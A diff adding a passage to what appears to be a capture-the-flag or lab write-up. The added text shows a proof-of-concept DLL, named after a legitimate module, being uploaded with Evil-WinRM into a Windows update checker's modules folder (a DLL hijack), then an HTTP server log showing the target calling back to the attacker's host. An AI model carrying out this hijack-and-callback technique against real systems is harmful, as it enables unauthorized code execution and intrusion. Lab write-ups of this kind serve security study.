@@ -746,5 +746,23 @@ x86_64-w64-mingw32-gcc -shared poc.c -o wuaclt.dll
 Ill then compile it
 
 ```python
-
+*Evil-WinRM* PS C:\Program Files\WindowsUpdateChecker\modules> upload wuaclt.dll
+                                        
+Info: Uploading /home/kali/hsm/NorthStone/wuaclt.dll to C:\Program Files\WindowsUpdateChecker\modules\wuaclt.dll
+                                        
+Data: 116224 bytes of 116224 bytes copied
+                                        
+Info: Upload successful!
 ```
+
+Then ill upload it and after a minute:
+
+```python
+python3 -m http.server 80                           
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.1.209.181 - - [29/Jul/2026 20:59:52] code 404, message File not found
+10.1.209.181 - - [29/Jul/2026 20:59:52] "GET /test.txt HTTP/1.1" 404 -
+```
+
+It reaches back to me!
+
